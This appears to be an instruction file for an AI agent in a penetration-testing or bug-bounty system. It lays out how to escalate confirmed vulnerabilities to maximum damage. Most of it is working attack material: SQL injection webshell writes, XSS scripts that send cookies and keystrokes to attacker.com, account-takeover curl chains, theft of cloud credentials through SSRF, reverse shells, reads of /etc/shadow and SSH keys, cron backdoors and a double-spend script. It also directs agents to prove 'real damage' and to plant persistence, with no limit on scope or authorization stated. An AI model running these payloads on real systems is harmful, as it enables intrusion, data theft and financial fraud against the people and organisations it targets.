---
name: escalator
description: Finding escalation engine — takes ANY confirmed finding and systematically attempts every possible escalation scenario with real PoC steps to push it to the highest achievable severity. Never stops at initial severity. Chains, pivots, abuses context until max damage is proven or all paths exhausted.
---

# Finding Escalator — Maximum Damage Extraction Engine

## Purpose

Every finding starts somewhere. This skill takes a confirmed finding and
**systematically attempts every escalation path** with real, executable
PoC steps — not theory, not "could potentially," but actual requests
against the target. The goal: push every finding to the highest possible
severity or exhaust every path proving it can't go higher.

**This is the bridge between "I found something" and "here is maximum impact."**

---

## Escalation Decision Matrix

When a finding arrives, run it through this matrix IN ORDER. Each path
is a real PoC attempt. Skip a path only if it's TECHNICALLY impossible
for this finding class (e.g., SSRF escalation paths don't apply to XSS).

### Step 0: Classify the Finding

```
FINDING CLASS: [SQLi|XSS|IDOR|SSRF|Auth Bypass|Race|File Upload|XXE|SSTI|Cmd Injection|Open Redirect|Mass Assignment|Business Logic|Info Disclosure|CSRF|Session Fixation]
SEVERITY: [Critical|High|Medium|Low|Info]
ENDPOINT: [full URL with method]
PARAMETER: [which param is vulnerable]
AUTH STATE: [authenticated as who? which role?]
TENANT: [which tenant/organization]
```

---

## ESCALATION PATHS BY FINDING CLASS

### A. SQLi Escalation Matrix

**Starting point: confirmed SQLi on parameter X of endpoint Y**

| # | Escalation Path | Real PoC Steps | Expected Impact |
|---|----------------|----------------|-----------------|
| A1 | UNION-based data extraction | Extract all tables, then sensitive columns (users, passwords, tokens, API keys, PII) | Critical — full DB breach |
| A2 | Stacked queries → write file | `'; SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--` | Critical — RCE |
| A3 | `LOAD_FILE()` → source code | `UNION SELECT LOAD_FILE('/var/www/html/.env'),2,3--` | Critical — secrets extraction |
| A4 | `xp_cmdshell` (MSSQL) | `EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--` | Critical — RCE |
| A5 | `sys_exec()` (PostgreSQL) | `SELECT sys_exec('curl http://attacker.com/$(whoami)')` | Critical — RCE |
| A6 | Blind → OOB exfiltration | Use `LOAD_FILE('\\\\attacker.com\\share\\'||(SELECT password FROM users LIMIT 1))` | Critical — blind data extraction |
| A7 | Time-based → credential dump | `' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0) FROM users--` | High — credential extraction |
| A8 | Database user → file read → admin creds | Read config files → find hardcoded DB creds → connect directly → extract all data | Critical — lateral movement |
| A9 | SQLi on one param → test ALL params | Every parameter on every endpoint gets SQLi tested | Coverage maximization |
| A10 | SQLi → SSRF via `xp_dirtree` / `COPY` | Use DB features to make server-side requests → reach internal services | Critical — SSRF pivot |

**Execution template (A1 — UNION extraction):**
```bash
# Step 1: Determine column count
PAYLOAD="' ORDER BY 1--"
PAYLOAD="' ORDER BY 2--"
# ... until error

# Step 2: Find vulnerable column positions
PAYLOAD="' UNION SELECT NULL,NULL,NULL--"
# Replace NULL with string types until you find reflection points

# Step 3: Extract table names
PAYLOAD="' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables WHERE table_schema=DATABASE()--"

# Step 4: Extract column names of sensitive tables
PAYLOAD="' UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name='users'--"

# Step 5: Dump sensitive data
PAYLOAD="' UNION SELECT GROUP_CONCAT(username,0x3a,password,0x3a,email SEPARATOR 0x0a),2,3 FROM users--"

# Step 6: Save evidence
echo "$PAYLOAD" > exploit/FXXX/payload.txt
# Save full request + response
```

---

### B. XSS Escalation Matrix

**Starting point: confirmed XSS (stored/reflected/DOM) on parameter X of endpoint Y**

| # | Escalation Path | Real PoC Steps | Expected Impact |
|---|----------------|----------------|-----------------|
| B1 | Cookie/Session theft | `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>` | High — session hijack → ATO |
| B2 | CSRF token theft → state change | `fetch('/api/csrf-token').then(r=>r.json()).then(d=>fetch('https://attacker.com',{method:'POST',body:JSON.stringify({csrf:d.token,cookies:document.cookie})}))` | High — full account control |
| B3 | Password change via victim | Inject form POST to `/api/change-password` with attacker-controlled password | Critical — ATO |
| B4 | Email change → password reset | `fetch('/api/email',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.com'})})` | Critical — permanent ATO |
| B5 | Admin panel XSS → admin ATO | If admin views: steal admin session → create backdoor admin account | Critical — full system compromise |
| B6 | Keylogger injection | `document.onkeypress=e=>fetch('https://attacker.com/log',{method:'POST',body:e.key})` | High — credential harvesting |
| B7 | Internal network scan | `<script>fetch('http://192.168.1.1/').then(r=>fetch('https://attacker.com/alive?ip=192.168.1.1'))` | Medium — network recon |
| B8 | Cryptocurrency wallet swap | Replace displayed crypto addresses with attacker's address | Financial — direct money theft |
| B9 | Stored XSS in email/notification | XSS in fields that get emailed (support tickets, comments, profile → shared) | High — wider victim pool |
| B10 | CSP bypass → full chain | Analyze CSP, find bypass (base-uri, script-src, domain allowlist gaps) | Enables all above |

**Execution template (B1+B4 — Cookie steal + Email change):**
```javascript
// Payload that steals session AND changes email
(async()=>{
  const c=document.cookie;
  const r=await fetch('/api/user/profile');
  const p=await r.json();
  // Exfiltrate
  await fetch('https://attacker.com/steal',{
    method:'POST',
    body:JSON.stringify({cookies:c,csrf:p.csrf_token,user:p})
  });
  // Change email for permanent ATO
  await fetch('/api/user/email',{
    method:'PUT',
    headers:{'Content-Type':'application/json','X-CSRF-Token':p.csrf_token},
    body:JSON.stringify({email:'attacker@evil.com'})
  });
})();
```

---

### C. IDOR Escalation Matrix

**Starting point: confirmed IDOR — can read/modify resource at ID X using account A's session**

| # | Escalation Path | Real PoC Steps | Expected Impact |
|---|----------------|----------------|-----------------|
| C1 | Horizontal read → vertical read | Try same ID swap on admin endpoints (`/api/admin/users/{id}`) | Critical — admin data access |
| C2 | Read IDOR → write IDOR | If GET works, try PUT/PATCH/DELETE on same resource with swapped ID | High — data modification |
| C3 | Write IDOR → mass assignment | Modify own record: add `role:admin`, `is_verified:true`, `permissions:['*']` | Critical — privilege escalation |
| C4 | IDOR → email change → ATO | Change victim's email to attacker's → password reset → full ATO | Critical — account takeover |
| C5 | IDOR → enumerate all IDs | Use discovered ID pattern to iterate (ffuf with ID wordlist) | High — mass data dump |
| C6 | IDOR on one resource → test adjacent | If user profile has IDOR, test `/users/{id}/settings`, `/users/{id}/billing`, `/users/{id}/tokens` | Critical — financial data |
| C7 | UUID IDOR → JWT manipulation | If you see UUIDs, decode JWT → find UUID claim → forge JWT with victim UUID | Critical — cross-tenant ATO |
| C8 | IDOR → API key extraction | Access `/api/users/{id}/api-keys` → steal API keys → programmatic access | Critical — full API compromise |
| C9 | IDOR → tenant switch | Modify tenant_id in request → access other tenant's data | Critical — multi-tenant breach |
| C10 | IDOR → webhook manipulation | If webhooks have IDs: access, modify, or trigger other users' webhooks | High — data leak or SSRF |

**Execution template (C4 — IDOR → ATO chain):**
```bash
# Step 1: Confirm write IDOR on email field
curl -s -X PUT "https://target.com/api/users/VICTIM_ID/email" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com"}'
# Response: 200 OK → write IDOR confirmed

# Step 2: Trigger password reset on new email
curl -s -X POST "https://target.com/api/password-reset" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com"}'

# Step 3: Get reset token from attacker's temp inbox
# (use @accounts disposable email infrastructure)

# Step 4: Reset password
curl -s -X POST "https://target.com/api/reset-password" \
  -H "Content-Type: application/json" \
  -d '{"token": "RESET_TOKEN", "password": "Pwned123!"}'

# Step 5: Login as victim
curl -s -X POST "https://target.com/api/login" \
  -d '{"email":"attacker@evil.com","password":"Pwned123!"}'

# Step 6: Verify access to victim's data
curl -s "https://target.com/api/users/VICTIM_ID/data" \
  -H "Authorization: Bearer $VICTIM_TOKEN"
```

---

### D. SSRF Escalation Matrix

**Starting point: confirmed SSRF — can make server fetch URL X**

| # | Escalation Path | Real PoC Steps | Expected Impact |
|---|----------------|----------------|-----------------|
| D1 | Cloud metadata → IAM creds | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Critical — cloud access |
| D2 | Internal service discovery | Probe `127.0.0.1:8080`, `192.168.x.x`, `10.x.x.x` for admin panels | Critical — internal admin |
| D3 | Internal admin panel → RCE | If Jenkins/Solr/Grafana found internally → use known exploits | Critical — full compromise |
| D4 | SSRF → file read | `file:///etc/passwd`, `file:///proc/self/environ`, `file:///var/www/html/.env` | Critical — secrets |
| D5 | SSRF → database access | If Redis/MySQL/Postgres on localhost → connect and extract data | Critical — DB breach |
| D6 | SSRF → port scan | Enumerate all internal IPs and ports via response timing | Network mapping |
| D7 | SSRF → AWS/GCP/Azure metadata | Provider-specific: `metadata.google.internal`, Azure IMDS | Critical — cloud creds |
| D8 | SSRF → internal API auth bypass | Internal APIs often skip auth — SSRF bypasses WAF/auth entirely | Critical — unprotected access |
| D9 | SSRF → log injection | SSRF with malicious headers → poison logs → log4shell-style | Critical — RCE |
| D10 | SSRF → webhook abuse | Make server POST to internal webhooks with attacker-controlled data | High — state manipulation |

**Execution template (D1+D3 — Metadata + Internal Admin):**
```bash
# Step 1: Confirm SSRF
curl -s "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
# Returns instance metadata → SSRF confirmed

# Step 2: Get IAM role name
curl -s "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Returns: my-app-role

# Step 3: Extract IAM credentials
curl -s "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-app-role"
# Returns: AccessKeyId, SecretAccessKey, Token

# Step 4: Use credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Step 5: Enumerate cloud resources
aws s3 ls
aws ec2 describe-instances
aws iam list-attached-user-policies --user-name app

# Step 6: Also probe internal services
for port in 80 443 3000 5000 8080 8443 9090 3306 5432 6379; do
  curl -s "https://target.com/api/fetch?url=http://127.0.0.1:$port/" | head -c 500
done
```

---

### E. Auth Bypass Escalation Matrix

**Starting point: confirmed auth bypass on endpoint/flow X**

| # | Escalation Path | Real PoC Steps | Expected Impact |
|---|----------------|----------------|-----------------|
| E1 | Bypass → admin access | Test bypass on admin endpoints (`/api/admin/*`) | Critical — full admin |
| E2 | Bypass → user enumeration | Access user list, extract PII for all users | Critical — mass data breach |
| E3 | Bypass → JWT forgery | If JWT validated client-side: forge admin JWT with `alg:none` | Critical — persistent access |
| E4 | Bypass → password reset | Trigger password reset for admin accounts | Critical — admin ATO |
| E5 | Bypass → API key generation | Generate API keys for admin access | Critical — programmatic compromise |
| E6 | Bypass → webhook access | Access/modify webhooks to exfiltrate data | High — persistent data leak |
| E7 | Bypass → billing access | Access billing, invoices, payment methods | Critical — financial data |
| E8 | Bypass → config access | Access application config → find hardcoded secrets | Critical — full compromise |
| E9 | Bypass → file access | Access admin file management → download backups | Critical — data breach |
| E10 | Bypass → scope expansion | Auth bypass on one endpoint → test EVERY endpoint without auth | Coverage maximization |

---

### F. Race Condition Escalation Matrix

**Starting point: confirmed race condition on operation X**

| # | Escalation Path | Real PoC Steps | Expected Impact |
|---|----------------|----------------|-----------------|
| F1 | Race → double-spend (financial) | 20 parallel purchase/transfer requests → verify extra credit/money | Critical — financial loss |
| F2 | Race → coupon reuse | 20 parallel coupon redemptions → verify all succeed | High — discount abuse |
| F3 | Race → balance manipulation | Parallel balance operations → verify manipulated balance | Critical — financial fraud |
| F4 | Race → duplicate account creation | Parallel registration with same email → verify multiple accounts | Medium → chain with ATO |
| F5 | Race → privilege escalation | Parallel role-change requests → verify elevated role | Critical — privesc |
| F6 | Race → order fulfillment bypass | Skip payment verification step → receive goods without paying | Critical — free goods |
| F7 | Race → subscription abuse | Parallel subscription start → multiple trial periods | High — service abuse |
| F8 | Race → 2FA bypass | Parallel 2FA verification with different codes → accept wrong code | Critical — 2FA bypass |

**Execution template (F1 — Double spend):**
```python
#!/usr/bin/env python3
import requests
import concurrent.futures

TARGET = "https://target.com"
TOKEN = "Bearer YOUR_TOKEN"

def transfer():
    r = requests.post(f"{TARGET}/api/wallet/transfer",
        headers={"Authorization": TOKEN, "Content-Type": "application/json"},
        json={"to": "recipient_id", "amount": 50})
    return r.status_code, r.json()

before = requests.get(f"{TARGET}/api/wallet/balance",
    headers={"Authorization": TOKEN}).json()
print(f"Before: ${before['balance']}")

# Fire 20 simultaneous transfers
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    futures = [ex.submit(transfer) for _ in range(20)]
    results = [f.result() for f in concurrent.futures.as_completed(futures)]

after = requests.get(f"{TARGET}/api/wallet/balance",
    headers={"Authorization": TOKEN}).json()
print(f"After: ${after['balance']}")
success = sum(1 for s, _ in results if s == 200)
print(f"Successful: {success}/20 — if >1 → DOUBLE SPEND confirmed")
```

---

### G. File Upload Escalation Matrix

**Starting point: confirmed unrestricted file upload**

| # | Escalation Path | Real PoC Steps | Expected Impact |
|---|----------------|----------------|-----------------|
| G1 | Upload → webshell → RCE | Upload `shell.php` with `<?php system($_GET['c']); ?>` | Critical — RCE |
| G2 | Upload → path traversal | Filename `../../shell.php` or `..%2f..%2fshell.php` | Critical — RCE |
| G3 | Upload → .htaccess override | Upload `.htaccess` with `AddType application/x-httpd-php .jpg` | Critical — RCE via .jpg |
| G4 | Upload → SVG XSS | Upload SVG with `<script>alert(document.cookie)</script>` | High — XSS/ATO |
| G5 | Upload → XXE | Upload SVG/XML with XXE payload | Critical — file read/SSRF |
| G6 | Upload → zip slip | Upload ZIP with `../../etc/passwd` entries | Critical — path traversal |
| G7 | Upload → ImageMagick RCE | Upload crafted image triggering ImageMagick exploit | Critical — RCE |
| G8 | Upload → deserialization | Upload serialized object (Java .class, PHP .php, Python .pkl) | Critical — RCE |

---

### H. Open Redirect Escalation Matrix

**Starting point: confirmed open redirect on parameter X**

| # | Escalation Path | Real PoC Steps | Expected Impact |
|---|----------------|----------------|-----------------|
| H1 | Redirect → OAuth code theft | Use as OAuth redirect_uri → intercept auth code | Critical — ATO |
| H2 | Redirect → password reset token theft | Embed reset link with attacker domain → steal token | Critical — ATO |
| H3 | Redirect → XSS via redirect URL | `javascript:alert(1)` as redirect target (if JS URI allowed) | High — XSS chain |
| H4 | Redirect → credential phishing | Redirect to fake login page on attacker domain | High — credential theft |
| H5 | Redirect → CORS bypass | Use redirect to bypass CORS origin checks | High — cross-origin data theft |
| H6 | Redirect → content injection | `data:text/html,<script>...</script>` as redirect target | High — injection |

---

### I. SSTI Escalation Matrix

**Starting point: confirmed SSTI on parameter X**

| # | Escalation Path | Real PoC Steps | Expected Impact |
|---|----------------|----------------|-----------------|
| I1 | SSTI → RCE | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | Critical — full RCE |
| I2 | SSTI → file read | `{{config.__class__.__init__.__globals__['open']('/etc/passwd').read()}}` | Critical — file read |
| I3 | SSTI → template analysis | `{{config.items()}}` → enumerate all config, find DB creds, API keys | Critical — secrets |
| I4 | SSTI → internal network | Use SSTI to make HTTP requests to internal services | Critical — SSRF |
| I5 | SSTI → reverse shell | SSTI RCE → `bash -i >& /dev/tcp/attacker/4444 0>&1` | Critical — persistent access |

---

### J. Command Injection Escalation Matrix

**Starting point: confirmed command injection on parameter X**

| # | Escalation Path | Real PoC Steps | Expected Impact |
|---|----------------|----------------|-----------------|
| J1 | Command injection → RCE confirmation | `; id; whoami; cat /etc/passwd` | Critical — OS access |
| J2 | Blind → OOB confirmation | `; curl http://attacker.com/$(whoami)` | Critical — blind RCE |
| J3 | RCE → reverse shell | `; bash -i >& /dev/tcp/attacker.com/4444 0>&1` | Critical — persistent shell |
| J4 | RCE → credential extraction | `; cat /etc/shadow; cat ~/.ssh/id_rsa; env \| grep PASS` | Critical — credential theft |
| J5 | RCE → database access | `; mysql -u root -p'pass' -e 'SELECT * FROM users'` | Critical — DB compromise |
| J6 | RCE → lateral movement | `; nmap -sT 192.168.1.0/24; curl http://192.168.1.x/admin` | Critical — network pivot |
| J7 | RCE → persistence | `; echo '*/5 * * * * curl http://attacker.com/shell.sh | bash' > /var/spool/cron/crontabs/www-data` | Critical — backdoor |

---

### K. XXE Escalation Matrix

**Starting point: confirmed XXE on endpoint X**

| # | Escalation Path | Real PoC Steps | Expected Impact |
|---|----------------|----------------|-----------------|
| K1 | XXE → file read | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Critical — arbitrary file read |
| K2 | XXE → SSRF | `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` | Critical — cloud access |
| K3 | XXE → blind OOB | External DTD on attacker server → exfiltrate data via HTTP | Critical — blind file read |
| K4 | XXE → DoS (billion laughs) | `<!ENTITY lol1 "&lol;&lol;&lol;&lol;">` repeated | Availability impact |
| K5 | XXE → RCE (expect/libxml) | `<!ENTITY xxe SYSTEM "expect:id">` or PHP expect | Critical — RCE |

---

### L. Mass Assignment Escalation Matrix

**Starting point: confirmed mass assignment — can modify extra fields**

| # | Escalation Path | Real PoC Steps | Expected Impact |
|---|----------------|----------------|-----------------|
| L1 | Mass assign → role escalation | Add `role:admin`, `is_admin:true`, `permissions:['*']` | Critical — admin access |
| L2 | Mass assign → email takeover | Add `email:attacker@evil.com` → password reset | Critical — ATO |
| L3 | Mass assign → credit/balance | Add `balance:999999`, `credits:99999` | Critical — financial fraud |
| L4 | Mass assign → verified status | Add `email_verified:true`, `kyc_verified:true` | High — bypass verification |
| L5 | Mass assign → subscription | Add `plan:enterprise`, `subscription_active:true` | Critical — free premium |
| L6 | Mass assign → tenant switch | Add `organization_id:OTHER_TENANT` | Critical — cross-tenant |

---

### M. Session Fixation Escalation Matrix

**Starting point: confirmed session fixation**

| # | Escalation Path | Real PoC Steps | Expected Impact |
|---|----------------|----------------|-----------------|
| M1 | Fixation → CSRF → ATO | Fix session → CSRF victim into authenticating → attacker has victim's authenticated session | Critical — ATO |
| M2 | Fixation → admin → RCE | Fix admin session → perform admin actions → create backdoor | Critical — full compromise |
| M3 | Fixation → email change | Fix session → change email → password reset → permanent ATO | Critical — persistent ATO |

---

### N. Business Logic Escalation Matrix

**Starting point: confirmed business logic flaw**

| # | Escalation Path | Real PoC Steps | Expected Impact |
|---|----------------|----------------|-----------------|
| N1 | Logic flaw → free products | Negative quantity, price manipulation, discount stacking | Financial — free goods |
| N2 | Logic flaw → unauthorized access | Step-skip in subscription flow → access premium features | Critical — free premium |
| N3 | Logic flaw → workflow abuse | Skip approval steps → admin actions without approval | Critical — privesc |
| N4 | Logic flaw → financial fraud | Manipulate refunds, transfers, credit operations | Critical — direct financial loss |
| N5 | Logic flaw → account abuse | Referral cycling, trial reuse, account deletion + re-registration | High — service abuse |

---

## UNIVERSAL ESCALATION CHECKLIST

For EVERY finding, regardless of class, check these 10 escalation
angles before declaring severity final:

| # | Universal Check | How to test |
|---|----------------|-------------|
| U1 | **Can I read other users' data?** | Change ID params, iterate, extract PII |
| U2 | **Can I modify other users' data?** | Try PUT/PATCH/DELETE with swapped IDs |
| U3 | **Can I escalate my role?** | Add admin/role fields, access admin endpoints |
| U4 | **Can I access admin functionality?** | Discover admin endpoints, test without auth |
| U5 | **Can I achieve RCE?** | Command injection, file upload, SSTI, deser |
| U6 | **Can I extract credentials?** | DB dump, config file read, .env, SSH keys |
| U7 | **Can I access financial data?** | Billing endpoints, payment methods, invoices |
| U8 | **Can I pivot to other services?** | SSRF to internal, cross-subdomain, cross-tenant |
| U9 | **Can I maintain persistent access?** | Backdoor, API key, webhook, cron job |
| U10 | **Can I chain with another finding?** | Read exploit-chains skill, check chain board |

---

## Escalation Execution Protocol

### Phase 1: Rapid Fire (5 minutes)
Run paths U1-U10 as fast as possible. For each path:
1. Craft the specific PoC request
2. Send it
3. Check response for impact
4. Log result: CONFIRMED / RULED-OUT / NEEDS-MORE-TESTING

### Phase 2: Deep Dive (15 minutes)
For every CONFIRMED path from Phase 1:
1. Full exploitation chain with evidence
2. Copy-paste reproducible steps
3. Real data/access/damage proof
4. Save to `exploit/<finding-id>/escalation-<path>.md`

### Phase 3: Chain Check (5 minutes)
For every RULED-OUT path, ask: "Does another finding enable this path?"
- Check chain board for complementary findings
- Test combination chains
- If chain works → new confirmed finding at higher severity

### Phase 4: Final Severity Assignment
```
ACTUAL SEVERITY = MAX(initial_severity, all_confirmed_escalations)
```

Only the final, escalated severity reaches the report.

---

## Output Format

Every escalation attempt produces a result card:

```
## Escalation Path: [ID] — [CLASS]
Status: CONFIRMED | RULED-OUT | NEEDS-MORE-TESTING
PoC: [exact curl/script that worked or failed]
Evidence: [request/response or screenshot reference]
Impact if confirmed: [what attacker gains]
Severity change: [initial] → [new if escalated]
Next: [what to try next, or "max severity reached"]
```

All results go to `exploit/<finding-id>/escalation-attempts.md`.

---

## When to Stop

Stop escalating when ONE of these is true:
1. **RCE achieved** — nothing is higher, stop here
2. **Full ATO with persistence** — nothing short of RCE beats this
3. **Full data breach of all sensitive tables** — max data impact
4. **All 10 universal paths exhausted** with no further escalation
5. **All class-specific paths exhausted** for this finding class

**If you stopped because of reason 4 or 5, document what was tried
and what was the ceiling — this prevents other agents from re-trying
the same dead paths.**

---

## Integration with Agent Workflow

### When @escalator is called
- **Input:** A confirmed finding from @vuln, @bizlogic, @exploit, or @bac
- **Process:** Run through complete escalation matrix
- **Output:** Escalated finding with full PoC, or confirmed max severity

### Who calls @escalator
- **@vuln** — after confirming a finding that's below Critical
- **@exploit** — after verifying a finding needs severity bump
- **@chain** — when a chain component needs escalation
- **@bizlogic** — when a logic flaw needs impact demonstration
- **@build** — when findings are piling up at Medium severity

### What @escalator returns
- All attempted escalation paths with results
- Confirmed escalated findings with full PoC
- Ruled-out paths with what was tried
- Final severity recommendation

### How @escalator interacts with @chain
- @escalator handles SINGLE-FINDING escalation (depth)
- @chain handles MULTI-FINDING combination (breadth)
- @escalator feeds escalated findings to @chain for combination analysis
- @chain feeds combination candidates back to @escalator for PoC construction

---

## Anti-Patterns (What NOT to Do)

- **DON'T stop at initial severity** — every finding goes through escalation
- **DON'T be theoretical** — send real requests, get real responses
- **DON'T skip paths because they "probably won't work"** — test them
- **DON'T re-test paths already ruled out** — check the attempts log first
- **DON'T report "could potentially escalate to X"** — either you proved it or you didn't
- **DON'T waste time on Info/Low findings** — if it can't reach High/Critical after exhaustive escalation, log and move on
- **DON'T duplicate @chain's work** — escalation is single-finding depth, chain is multi-finding breadth
